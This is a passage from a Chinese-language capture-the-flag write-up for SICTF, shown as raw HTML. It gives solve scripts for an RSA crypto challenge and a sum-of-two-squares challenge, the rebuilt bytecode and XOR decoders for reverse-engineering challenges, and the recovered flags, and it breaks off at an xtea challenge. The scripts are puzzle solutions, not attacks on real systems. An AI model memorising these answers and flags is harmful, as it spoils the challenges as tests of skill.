class="hljs-number">510598540378970007468346322989879190780475356832709189528874695730531468123747091318830966440138615736420891392158097533731041150162690662471483619765171875053776526546923686545162088172326434280369545887080098691661618888498451216122577703462656147845476260802989936275927468143618457014875124540773380472942489037761179303561650189545290190421786318533073909424735517884608967725919128200358535113829753453601297612782921831305721998858231417374167746154206561475003022801732102170674160043866579234096945753255309604584663823273990392197858273029361669185072049422597132579136784027822968387907216366150999438414498332890674564920800382005582891491049365978733797356415518435343495821039314228388769356638637099572998812062355774848959446125701462950655806332002764535951282449862140062574418031213788534096501985200284615865248974807525604893147298611402252296159828500266098282909607218395957805357667923653409828275804406466185333491486073920384298557332939701611488655278812282652143513835104674009767479927241052662403578967182673338296967573503287747778401579267126898937724971226916836862238412923209155792382534204896050548824028658237640251964366961727999178646613907934616655737902329568420682808750546571786374023614255135110482419627491157502417864563832543812083026753673687664854910877686333766643694031564516722983669199704788291656757271915091399977189663329054202997146978631991467923388119989473941572476162990901960011968892272676827771256008656450296183884491251752111424531449198118292179798490440493223653950102915889401116251591885909790869073018774674246846164536910633015902964911907187085243240032540938841961345835517368130042501382327926289017383981908729734129193302049155793436988510517701765733605569135643208447952662352778482137713239592896997102366230279153456455232519301534222340901671138239539845240151878610363390683459663471954623868659324304077587611084188341121303918876492043578883059738615210439439368338460631574255417822627815523601923537626576677004085017875860928802762176477815284840936951142176532768517728636562256240668409525184886142801802825451465440993457022771077957094228957592122319682216294509338262739872163482972508991702525289361105971574659126127296233247905505496525683817711366704746617027744889413904684867577081667137187623825349410229389484199608739864221035985277681307389939848405790294473878622092200837753161101695539947514614727699952200114544362051873938505591469240465379091377837297561323297393518152524513948294475770774872596601345526469590486037386767964812631618224527233850818909346007449756779707319609915127618828551910681421647307180399632857248867655836894968134457622987954781685664833951774981383914013420724637676787907498490619865488706542422141338754933476190313653530739822029700217857534243473680585150263523947891501341441371965435851479670882202992955935279933652356336270251591324623898094984119190752775236005057405257945038031382867511822173122001309505728526596893926445291712035117553637589190292816001770554129840326832888707541999454791653742647879694585329112697382151447923691770809327807665376014114552626285289291808032845544905356380497227622738746307685611140483875177839511922977657045680353723672792411661489242162646272105649970359134277499907207906149573299990033858943215801954126448693460102775418225293255402758159431943811872373682053160944887775375465971432320964554947377318554518275854303099420999992690990916801757184853847474379621177976926681977371922191722085164910430032177320954341986984523594583172470609743970245810969858512632597943721628165724329447516823159387734220282510185959768239630017162115072758419177056571781075148374822721899683720488356041096248563880547752710289151512607087038310649235610688255059182467964379544134070766646863815775576049106337955345150055151813028534690066771104188418296440067303355417210829440978858599306487361626723932883675404705319649877631289465547597225908934420304867048341698308940436377375588905463549199568800788130324653074398891097223958392703515180958466771395566567923630440881986781120062769327993137151783189811570714391264155060840731029466593405853721833971303821804104382800673631786729744779165371433211267361024896576031556979771007693215198547296582235167582106419779580693225211695215406540025468141235241168387527901851774993867055740692835931115312659500713701652905802357951993290979099170159167009106534001226859533836082801229997337966972579186548771169099646656172882424089451273021293821026173210665095782802709874946641962115525841325300318524665386511421662860490620819561338110623774842340380068922415609137358448899126553279894950604871889208579886778999174405582160576479554324208876082033912031737086248121899303730781498156597249803927142235444644481388064486155431912003641095674949903404176810866307571531389637794147871012904134653569388493652441432759092336752228939764110397029831387803943394811558386122839568158928461007578259968765727092577006588264867960486472014493774664081407186721351852883527145790575242285664659303948842228766554243966691396492391152581830022133814454196259968655735361775914705332258892954614272244452518449260489348504449204461418971768011384340273291232094176572232837038670467853897665877851434992557429017504229337778470080893449423405491607587635438331476572996201482633587271479001915768182336813417460145272910780420062773057289352127058606048428315185624554551172152106354445240590380140756355226376829443068190672329776832112173322011137862590548721676059398379694994522794474774534579546109677615257696703950497332824299576069196330271666459758430542051969093680846765661685489556479825015505460585577388300005030240514448617715276600874290664416888184557142542207029827016362686924883704397874129412267949416733492080843315519912943048041880665442664534980370689081266908497051077237188221752059058912835617635691061804481035908317765279937217591432632832678806430381325340000898958680468694182993189208039459712391492410123386884340504648296815916980264240229859574883155040793388439699245314010536014311134726579595932201351264754211113984594974123575279085420654342347792446273359397655783349850267895960713020361459104930811498666622216299579774939159380045958811891996366190154624989040001455252320159516822116133341010157165599727635333348456688307169980804760876207246783116588952529877373514768545007418968307885769960168050996962066803264260375707466369627458024513973771207018864983698407016663019106354023164759250846073414341438963394719456500998324900154652118420207057668806120330181700845296117532235012372135050553397046174401449323031309344766628888675704109715329046692002106076405553528413866402862565543443907259825033515101841485790388106868972724754988229771779715569516295419556055234476868558577442887306482605945053829666543946452255290321024138948999088611233226734197091325915223296133751626031378197131875533631358612215053149934608672729194446883476706267066475008836864936670808320239466055935088929279252129128009704233352664523535820092988950793050907265677092793104426094212209504897403359406325045852228354350509453013015487815230129380079713113632363881496974185547766115624580099624722897692297760495094913178120692467666707678647081180656345151015995338390986674404981831649353833607305738823436744297628382797810952028446046016233612873716789383675779820186248250486000672269630344269347652027789034023080859790238772676504723029078903218723114249502157501775936110552413022658586833869562215506206204712447588632398550497708640229614956652263449460598992811393334042395804931240940416629178335447861485028284981615219874331354750385150254017244750993573994159458909546341067039268159319391512934162794663414200907868505060542602841564239761181077333990423542820064315891665379550720216448942932714180923613869070005330476506812100063599659432570925437054287120906048730323556681557905787470647037629769660028387819741611799183349496549168370221978146678987457271259655273299546276899538032070218474555442304430064164467753804089753466882786069297036926063093020795423414152340563079346797084488827259011515774643776620378827875819192074121522712821147817374988804339999134520633699074448564057555026364304855373068414955699295158212425760345481057281658337956841137897162198027254556350868502178340964817530029135654659162400076087528650997151875596189190736466304722028587441680622878918057024286243448077104494316372739218635221411755498456912672491099154558604384574583302548226057069534004474532514444674565766058970748694657151540644416463532338966570743112669782840065402131461088637463019996192189423665651801811614499041923273110971446683450048861113332787126098622974613883291506736280588039145040361795192519576202306796277888696719887642051327259799873478040156450250036778305950744573270786882726162630115640020293415918210448873867037875790399234972055537649774407094382744621251926131880807765203843946682834221238903263352845265134368550124026502981782369374484091775137498831749984649699756860976525160646445060537001</span><br>c = <span class="hljs-number">25311588269686177955448734593829241225577179988164713941852977611031657483354358211703127234256857543045931490595235462694154500286504335321863566904591526587164297277540588019404183750093303030110155964308233155625979213391426577001127732161793532171930032372311485789800839135378584125843945003217786635500780784536181313697728354510921343049319891609423580951127082479154042124088536642353812516362473763243425336498681024731131013712158320926550826023277898283823992258572884077276506953901984370413493389421701244517177275694290580595883324705204426546600360091062972293159479880268240701929584137714053692704173792703744319619320692061092061615202753943135058204637610994232168818081462863915909261100211958674543647005416235222620606212841753586419836448681445654681389951211124603287962397164672343026391101395393442103086256726266031275710666309840451443110824175976964355109239201609721120961810198879456321855222352235065257082872600438604687617267718725588993464084147695037610145634237788526691386358596867368523164061114195245860062033244276270480267737617206612775486335779851309426638789250166900931784751600508190450785806340839297468432626354823268011108399699249876358363866293469899572158837757748629586492339783888456600259136387616777593894789302431752391447333278000811521062096467397501227651566498970779080811188805992370970942403208432494393387894197176720244315639559895616799551357601688597541585709039366190088117378880414928532937085490713336140523926983900188378021593225550131993528275166272215028510435690944582596557549068715312515919059333916941744937308255671959764859162487792658274812322891679161915480098864709106347357292015949882243095564999283630289876842913558415205967734452657944991350268108202225952952066459093168792825684626405271617613362070897142103054139806566495183172335794957308822648116537830567396971238329939142829563169355194093529211071160078683833491919940022871862059981346961003867620542620578917684687869682550269127226291011607064545739386850054846167307744022708831833252517778607796258598290908139274345221343651583618249287308738279011682960787460189183445095638164116734700624496711487227176740828397696295620232796356005136058517828311139839381424066302086111930635998143063033446131859852797958765199173807715541045956108285596958780742834805533223538366354327087736088500599094358107164689423572964793385788194218918919596478862097292477628426360333874314260108133339375942666508606311391805252966277961758108821946154428477616100004321457604879220523742427633323872953699931521980332026241531049474031438142792394628576016121322036294740176980189940853036679375845577017978783071015970829136676221389585848058189544793760570196797629432282672371000290840492119720433350192833648839794730598188620374416865232426658538841900897108162173580739323675324880778494924038982358349531848197090990541020708295116156624389135273650491811601011636903928586011504526431498652011548693157985029456398851189821020778958527809174433156243544030624341915713810661287037659586018768085470670240790942171506843637271442721823608266490364627429331023698199955218456371716269004979764982383921294842864121196124699402037204598504310969390789092001114319822852242500941141355281693725110460506548426263105213498404197519606615831672853931646583757742145492562101250546593997874586076926641241047317510838024042147508770595175718146175716833867781581245298658392175502069483979736336330731124942036757071709086638075284655589787868565023763734664219353940143820183318534640360506287779208468427268377183973501528333749816003855834863565394122448191029578528511650194632623989208637401008114422451686312319644054514944700566430912835340518601698767128195833704182657730566589247891277627101027106635732998136735398078858899384713118593668984773592904704131402905145754570091966901120411201405256435232063295790833161132002246279663161388421997242226907126829858922174709653627696146355472690262198127338971112610753839661677080463775112411884196230185877234066728564716929551607129141735155379529048300204700285511666205204686244751557147684338591300111406075976759988295937870045743031816067994768915303111125253664865369863586807234945352445045026501495849671447691502253489642657652848949102823407762108943161789244134119866441040670840037015617307056821150285453994199024947457774647253618512995677313792036106100497936654142008173389260345411854520383366800831542339243757421033121103167943520915885043698882609693007629591093225819727653240183003450339802857059736870645197609170799838610316307123146927966669912638227587517396282910946355194781275415343491170583392480153599086125374051844306869510079152461763122622668280249192047024784624692776244265874153473114993619019113474166958126841368545758693832786756946298833891033171752534079387364641021835311861509609494125593285947444939996542402774020507531158198766149282993994638607458820211163623309687149807339960007614766879688676462400606899851539023671152038536934433128973358637812907001112093086713949701646964777013925616637956114825918525229968119306607256312727518429074253193934915609865400118400124334806320033990630595454381780378123232633134565408152216410478497582716891919477755736223636583493709691482948793995974775520709337409910573358960632077245564017495103173982250506224927848890977671698731337737945862469303397352291579706358090437359126171980555387033997507170208063868788685780633727495158542911276981383764698030088894904043298340184342818716278091407356551940358010532738356144600648671870141201656260882560550096111259047730234565173017875969390130055742832375612379167064701421263006004472414998830886590121784525812803198481744263349186310137594023961272959521982892804372412802448375074058059953851751721276448647238818757245128139844126234490887064897176175605991477364838775902549049484485649550475857257115219540606931472558004890564503134870490140656624241401747198540715275804941032074573356860460172868340373583692584902872979221114982298050586685719887060873413850621645519128954022253850929825608263273096476942591333367968509790925478388960974334157155990587259664085903377635645971389261554405014491809856113962072321115329323751880850245450855429733690986687462514539793256111238991830404264833945950057548041347552265351912075406068254301589527368376552057750656888595867048015012255350060023438752477068307445956245683183096512267217891149812719686622381240260466772552889788641876064057960173837664029586196731436456574414559972320705400861271592462379875676277251086312872195716024719468847393778892154498344296554136868868732950910162390521996660833516010868267341539744299603050842530651780425947531816479566426165422123252285427076862067553260240357395991463485011778125635347076641337205162163658915958257879189951068432591492287483129944125287963913713736174143726754563437013760958618334477377727596918588685928884428267449422751775309153821164066157157127578931430789782791432466972743083256930846560916380022935439074194208587413499830348721004306047843916090382879427208653946874404416581482497419737465638158237340330822703573665318917667360471294611610224794247546701801044290825387969994925735165223021550294577211312086169077389985367351707099712483698243658870007261177946508698830792080087400145468466457013023648585707831661968993789151545051681008263293021078693138432668411562842904645661356499891588207831214182852485507569391094080770281546830762172075737108196782354642073491890672014845707320966391491467609280627047834838773416130380735074488364271149543425149101272213833983451690912775914099688310078028317868139895586469648241691434390559738020665790535748911667198341478329818172050103593169144077713081858968945277802911631514524770516773987691162846774892828407010262766598402873965272708201519043339930474621748065360132998861911090097210247744181877811558047691563490093112810880988416880859363631693862441291401344868362517958157134815632633152101164792211199872770004214575342556751954753067436057216989105115974894826691301734658752554796336087163153087013755182247902851847839867807219615044427616326518986674768302109569955218389569458769985874451273117138435546665024826358058600551523916808015505037962468350942106702503883112975634757971636535249998962164886704286732345711210362931312187319836001555348202695806282730945501510756659164231139623277954192087899140537284122009070763979073048837471984618684020674370221463294306239424220412900401460550783283591789801735401367473630854684306273273881688896021682911944793729874921181848098382943970467341811398482121657330781393699096796050290808604481724879698091852697163383826854575487201365106673196811573729247280577781500366763330567122007588833805912087009446499739562463428568952248234506507069953596589309728265145195922268165106056450388840269349409588020300011340940321969965833519126936472969929255823540027083032424724503173052044192907375974391257436211908641463947719594493311129179150043015816776680636855703407557636501711566215605658114055289137679940955</span><br>e = <span class="hljs-number">19458216662993202562182929756256684791318810848802754020883513588583377528821730559897870095442161189229950925325157413999927847684731484753811988111830295294129447423655650029218971567158117911790213848402209470536199246476182240248742771389082526603384625792117047996128232952372477895218147279573573322975526303267821446640338606290250958710008158544852602338088244940388562828263436457418528981476220691508040085291576643321726669065360399003917048894093458055139757991688086912143763420958307099065105543361779847689716282373299487102518794317683805758527645283956734672229827240143254092779918701447288342107763</span><br><br>np = (<span class="hljs-number">8</span>**<span class="hljs-number">16</span>)*(<span class="hljs-number">128</span>**<span class="hljs-number">32</span>)*(<span class="hljs-number">4096</span>**<span class="hljs-number">2</span>)<br>p = gmpy2.<span class="hljs-title function_ invoke__">iroot</span>(n//np,<span class="hljs-number">58</span>)[<span class="hljs-number">0</span>]<br><span class="hljs-keyword">while</span> True:<br>    p = <span class="hljs-title function_ invoke__">prevprime</span>(p)<br>    d = gmpy2.<span class="hljs-title function_ invoke__">invert</span>(e,p-<span class="hljs-number">1</span>)<br>    m = <span class="hljs-title function_ invoke__">pow</span>(c,d,p)<br>    flag = <span class="hljs-title function_ invoke__">long_to_bytes</span>(m)<br>    <span class="hljs-keyword">if</span> b<span class="hljs-string">&quot;SICTF&#123;&quot;</span> in flag:<br>        <span class="hljs-keyword">print</span>(flag)<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">continue</span><br><span class="hljs-comment">#SICTF&#123;6ee93ffd-e903-49d6-b166-44680a294851&#125;</span><br></code></pre></td></tr></table></figure><h4 id="xy"><a href="#xy" class="headerlink" title="xy"></a>xy</h4><p>解方程平方和，sage上的函数 two_squares() 可以求出x,y</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#sage</span><br>enc = <br>x_y= <span class="hljs-title function_ invoke__">two_squares</span>(enc)<br><span class="hljs-keyword">print</span>(x_y)<br></code></pre></td></tr></table></figure><p>不会写交互，手撸<br><img src="/mdimg/sictf/37.png"></p><h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h4 id="LiHua’s-checkme"><a href="#LiHua’s-checkme" class="headerlink" title="LiHua’s checkme"></a>LiHua’s checkme</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">1</span>           <span class="hljs-number">0</span> LOAD_CONST               <span class="hljs-number">0</span> (<span class="hljs-number">114433</span>)<br>            <span class="hljs-number">2</span> LOAD_CONST               <span class="hljs-number">1</span> (<span class="hljs-number">114459</span>)<br>            <span class="hljs-number">4</span> LOAD_CONST               <span class="hljs-number">2</span> (<span class="hljs-number">114449</span>)<br>            <span class="hljs-number">6</span> LOAD_CONST               <span class="hljs-number">3</span> (<span class="hljs-number">114438</span>)<br>            <span class="hljs-number">8</span> LOAD_CONST               <span class="hljs-number">4</span> (<span class="hljs-number">114452</span>)<br>           <span class="hljs-number">10</span> LOAD_CONST               <span class="hljs-number">5</span> (<span class="hljs-number">114473</span>)<br>           <span class="hljs-number">12</span> LOAD_CONST               <span class="hljs-number">6</span> (<span class="hljs-number">114480</span>)<br>           <span class="hljs-number">14</span> LOAD_CONST               <span class="hljs-number">7</span> (<span class="hljs-number">114530</span>)<br>           <span class="hljs-number">16</span> LOAD_CONST               <span class="hljs-number">8</span> (<span class="hljs-number">114531</span>)<br>           <span class="hljs-number">18</span> LOAD_CONST               <span class="hljs-number">9</span> (<span class="hljs-number">114487</span>)<br>           <span class="hljs-number">20</span> LOAD_CONST              <span class="hljs-number">10</span> (<span class="hljs-number">114528</span>)<br>           <span class="hljs-number">22</span> LOAD_CONST              <span class="hljs-number">11</span> (<span class="hljs-number">114483</span>)<br>           <span class="hljs-number">24</span> LOAD_CONST               <span class="hljs-number">8</span> (<span class="hljs-number">114531</span>)<br>           <span class="hljs-number">26</span> LOAD_CONST              <span class="hljs-number">12</span> (<span class="hljs-number">114484</span>)<br>           <span class="hljs-number">28</span> LOAD_CONST              <span class="hljs-number">13</span> (<span class="hljs-number">114559</span>)<br>           <span class="hljs-number">30</span> LOAD_CONST               <span class="hljs-number">7</span> (<span class="hljs-number">114530</span>)<br>           <span class="hljs-number">32</span> LOAD_CONST              <span class="hljs-number">14</span> (<span class="hljs-number">114539</span>)<br>           <span class="hljs-number">34</span> LOAD_CONST              <span class="hljs-number">15</span> (<span class="hljs-number">114532</span>)<br>           <span class="hljs-number">36</span> LOAD_CONST              <span class="hljs-number">16</span> (<span class="hljs-number">114486</span>)<br>           <span class="hljs-number">38</span> LOAD_CONST              <span class="hljs-number">13</span> (<span class="hljs-number">114559</span>)<br>           <span class="hljs-number">40</span> LOAD_CONST              <span class="hljs-number">17</span> (<span class="hljs-number">114534</span>)<br>           <span class="hljs-number">42</span> LOAD_CONST              <span class="hljs-number">12</span> (<span class="hljs-number">114484</span>)<br>           <span class="hljs-number">44</span> LOAD_CONST              <span class="hljs-number">16</span> (<span class="hljs-number">114486</span>)<br>           <span class="hljs-number">46</span> LOAD_CONST              <span class="hljs-number">18</span> (<span class="hljs-number">114538</span>)<br>           <span class="hljs-number">48</span> LOAD_CONST              <span class="hljs-number">13</span> (<span class="hljs-number">114559</span>)<br>           <span class="hljs-number">50</span> LOAD_CONST              <span class="hljs-number">18</span> (<span class="hljs-number">114538</span>)<br>           <span class="hljs-number">52</span> LOAD_CONST              <span class="hljs-number">12</span> (<span class="hljs-number">114484</span>)<br>           <span class="hljs-number">54</span> LOAD_CONST              <span class="hljs-number">14</span> (<span class="hljs-number">114539</span>)<br>           <span class="hljs-number">56</span> LOAD_CONST              <span class="hljs-number">19</span> (<span class="hljs-number">114535</span>)<br>           <span class="hljs-number">58</span> LOAD_CONST              <span class="hljs-number">13</span> (<span class="hljs-number">114559</span>)<br>           <span class="hljs-number">60</span> LOAD_CONST              <span class="hljs-number">20</span> (<span class="hljs-number">114533</span>)<br>           <span class="hljs-number">62</span> LOAD_CONST               <span class="hljs-number">9</span> (<span class="hljs-number">114487</span>)<br>           <span class="hljs-number">64</span> LOAD_CONST              <span class="hljs-number">21</span> (<span class="hljs-number">114529</span>)<br>           <span class="hljs-number">66</span> LOAD_CONST              <span class="hljs-number">18</span> (<span class="hljs-number">114538</span>)<br>           <span class="hljs-number">68</span> LOAD_CONST              <span class="hljs-number">18</span> (<span class="hljs-number">114538</span>)<br>           <span class="hljs-number">70</span> LOAD_CONST              <span class="hljs-number">16</span> (<span class="hljs-number">114486</span>)<br>           <span class="hljs-number">72</span> LOAD_CONST              <span class="hljs-number">15</span> (<span class="hljs-number">114532</span>)<br>           <span class="hljs-number">74</span> LOAD_CONST              <span class="hljs-number">14</span> (<span class="hljs-number">114539</span>)<br>           <span class="hljs-number">76</span> LOAD_CONST              <span class="hljs-number">17</span> (<span class="hljs-number">114534</span>)<br>           <span class="hljs-number">78</span> LOAD_CONST              <span class="hljs-number">14</span> (<span class="hljs-number">114539</span>)<br>           <span class="hljs-number">80</span> LOAD_CONST               <span class="hljs-number">8</span> (<span class="hljs-number">114531</span>)<br>           <span class="hljs-number">82</span> LOAD_CONST               <span class="hljs-number">8</span> (<span class="hljs-number">114531</span>)<br>           <span class="hljs-number">84</span> LOAD_CONST              <span class="hljs-number">22</span> (<span class="hljs-number">114479</span>)<br>           <span class="hljs-number">86</span> BUILD_LIST              <span class="hljs-number">43</span><br>           <span class="hljs-number">88</span> STORE_NAME               <span class="hljs-number">0</span> (flags)<br><br><span class="hljs-number">2</span>          <span class="hljs-number">90</span> LOAD_NAME                <span class="hljs-number">1</span> (<span class="hljs-built_in">input</span>)<br>           <span class="hljs-number">92</span> CALL_FUNCTION            <span class="hljs-number">0</span><br>           <span class="hljs-number">94</span> STORE_NAME               <span class="hljs-number">2</span> (flag)<br><br><span class="hljs-number">3</span>          <span class="hljs-number">96</span> LOAD_CONST              <span class="hljs-number">23</span> (<span class="hljs-number">0</span>)<br>           <span class="hljs-number">98</span> STORE_NAME               <span class="hljs-number">3</span> (true)<br><br><span class="hljs-number">4</span>         <span class="hljs-number">100</span> SETUP_LOOP              <span class="hljs-number">52</span> (to <span class="hljs-number">154</span>)<br>          <span class="hljs-number">102</span> LOAD_NAME                <span class="hljs-number">4</span> (<span class="hljs-built_in">range</span>)<br>          <span class="hljs-number">104</span> LOAD_NAME                <span class="hljs-number">5</span> (<span class="hljs-built_in">len</span>)<br>          <span class="hljs-number">106</span> LOAD_NAME                <span class="hljs-number">2</span> (flag)<br>          <span class="hljs-number">108</span> CALL_FUNCTION            <span class="hljs-number">1</span><br>          <span class="hljs-number">110</span> CALL_FUNCTION            <span class="hljs-number">1</span><br>          <span class="hljs-number">112</span> GET_ITER<br>      &gt;&gt;  <span class="hljs-number">114</span> FOR_ITER                <span class="hljs-number">36</span> (to <span class="hljs-number">152</span>)<br>          <span class="hljs-number">116</span> STORE_NAME               <span class="hljs-number">6</span> (i)<br><br><span class="hljs-number">5</span>         <span class="hljs-number">118</span> LOAD_NAME                <span class="hljs-number">7</span> (<span class="hljs-built_in">ord</span>)<br>          <span class="hljs-number">120</span> LOAD_NAME                <span class="hljs-number">2</span> (flag)<br>          <span class="hljs-number">122</span> LOAD_NAME                <span class="hljs-number">6</span> (i)<br>          <span class="hljs-number">124</span> BINARY_SUBSCR<br>          <span class="hljs-number">126</span> CALL_FUNCTION            <span class="hljs-number">1</span><br>          <span class="hljs-number">128</span> LOAD_CONST              <span class="hljs-number">24</span> (<span class="hljs-number">114514</span>)<br>          <span class="hljs-number">130</span> BINARY_XOR<br>          <span class="hljs-number">132</span> LOAD_NAME                <span class="hljs-number">0</span> (flags)<br>          <span class="hljs-number">134</span> LOAD_NAME                <span class="hljs-number">6</span> (i)<br>          <span class="hljs-number">136</span> BINARY_SUBSCR<br>          <span class="hljs-number">138</span> COMPARE_OP               <span class="hljs-number">2</span> (==)<br>          <span class="hljs-number">140</span> POP_JUMP_IF_FALSE      <span class="hljs-number">114</span><br><br><span class="hljs-number">6</span>         <span class="hljs-number">142</span> LOAD_NAME                <span class="hljs-number">3</span> (true)<br>          <span class="hljs-number">144</span> LOAD_CONST              <span class="hljs-number">25</span> (<span class="hljs-number">1</span>)<br>          <span class="hljs-number">146</span> INPLACE_ADD<br>          <span class="hljs-number">148</span> STORE_NAME               <span class="hljs-number">3</span> (true)<br>          <span class="hljs-number">150</span> JUMP_ABSOLUTE          <span class="hljs-number">114</span><br>      &gt;&gt;  <span class="hljs-number">152</span> POP_BLOCK<br><br><span class="hljs-number">7</span>     &gt;&gt;  <span class="hljs-number">154</span> LOAD_NAME                <span class="hljs-number">3</span> (true)<br>          <span class="hljs-number">156</span> LOAD_NAME                <span class="hljs-number">5</span> (<span class="hljs-built_in">len</span>)<br>          <span class="hljs-number">158</span> LOAD_NAME                <span class="hljs-number">0</span> (flags)<br>          <span class="hljs-number">160</span> CALL_FUNCTION            <span class="hljs-number">1</span><br>          <span class="hljs-number">162</span> COMPARE_OP               <span class="hljs-number">2</span> (==)<br>          <span class="hljs-number">164</span> POP_JUMP_IF_FALSE      <span class="hljs-number">174</span><br><br><span class="hljs-number">8</span>         <span class="hljs-number">166</span> LOAD_NAME                <span class="hljs-number">8</span> (<span class="hljs-built_in">print</span>)<br>          <span class="hljs-number">168</span> LOAD_CONST              <span class="hljs-number">26</span> (<span class="hljs-string">&#x27;True!&#x27;</span>)<br>          <span class="hljs-number">170</span> CALL_FUNCTION            <span class="hljs-number">1</span><br>          <span class="hljs-number">172</span> POP_TOP<br>      &gt;&gt;  <span class="hljs-number">174</span> LOAD_CONST              <span class="hljs-number">27</span> (<span class="hljs-literal">None</span>)<br>          <span class="hljs-number">176</span> RETURN_VALUE<br></code></pre></td></tr></table></figure><blockquote><p>根据字节码还原python脚本 </p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">flags = [<span class="hljs-number">114433</span>, <span class="hljs-number">114459</span>, <span class="hljs-number">114449</span>, <span class="hljs-number">114438</span>, <span class="hljs-number">114452</span>, <span class="hljs-number">114473</span>, <span class="hljs-number">114480</span>, <span class="hljs-number">114530</span>, <span class="hljs-number">114531</span>, <span class="hljs-number">114487</span>, <span class="hljs-number">114528</span>, <span class="hljs-number">114483</span>, <span class="hljs-number">114531</span>, <span class="hljs-number">114484</span>, <span class="hljs-number">114559</span>, <span class="hljs-number">114530</span>, <span class="hljs-number">114539</span>, <span class="hljs-number">114532</span>, <span class="hljs-number">114486</span>, <span class="hljs-number">114559</span>, <span class="hljs-number">114534</span>, <span class="hljs-number">114484</span>, <span class="hljs-number">114486</span>, <span class="hljs-number">114538</span>, <span class="hljs-number">114559</span>, <span class="hljs-number">114538</span>, <span class="hljs-number">114484</span>, <span class="hljs-number">114539</span>, <span class="hljs-number">114535</span>, <span class="hljs-number">114559</span>, <span class="hljs-number">114533</span>, <span class="hljs-number">114487</span>, <span class="hljs-number">114529</span>, <span class="hljs-number">114538</span>, <span class="hljs-number">114538</span>, <span class="hljs-number">114486</span>, <span class="hljs-number">114532</span>, <span class="hljs-number">114539</span>, <span class="hljs-number">114534</span>, <span class="hljs-number">114539</span>, <span class="hljs-number">114531</span>, <span class="hljs-number">114531</span>, <span class="hljs-number">114479</span>]<br>flag = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flags:<br>    flag += <span class="hljs-built_in">chr</span>(i^<span class="hljs-number">114514</span>)<br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-comment">#SICTF&#123;b01e2a1f-096d-4fd8-8f95-7e388d694911&#125;</span><br></code></pre></td></tr></table></figure><h4 id="Super-Mario-Bros"><a href="#Super-Mario-Bros" class="headerlink" title="Super Mario Bros"></a>Super Mario Bros</h4><p>原项目：<a href="https://github.com/heart6622/python_SuperMario">https://github.com/heart6622/python_SuperMario</a><br>用python3.10正确反编译<br>题目提示源码在./source目录下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">from</span> pwn import <span class="hljs-keyword">xor</span><br>s=[<span class="hljs-number">10</span>, <span class="hljs-number">9</span>, <span class="hljs-number">23</span>, <span class="hljs-number">2</span>, <span class="hljs-number">23</span>, <span class="hljs-number">109</span>, <span class="hljs-number">15</span>, <span class="hljs-number">7</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>, <span class="hljs-number">58</span>, <span class="hljs-number">71</span>, <span class="hljs-number">22</span>, <span class="hljs-number">51</span>, <span class="hljs-number">82</span>, <span class="hljs-number">93</span>, <span class="hljs-number">20</span>, <span class="hljs-number">92</span>, <span class="hljs-number">93</span>, <span class="hljs-number">28</span>, <span class="hljs-number">41</span>, <span class="hljs-number">3</span>, <span class="hljs-number">25</span>, <span class="hljs-number">78</span>, <span class="hljs-number">0</span>, <span class="hljs-number">44</span>, <span class="hljs-number">16</span>]<br>key= <span class="hljs-string">&#x27;level num&#x27;</span><br><span class="hljs-keyword">print</span> (<span class="hljs-keyword">xor</span>(s,key))<br></code></pre></td></tr></table></figure><h4 id="babyre"><a href="#babyre" class="headerlink" title="babyre"></a>babyre</h4><p>xtea    算法<br>re✌的exp：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 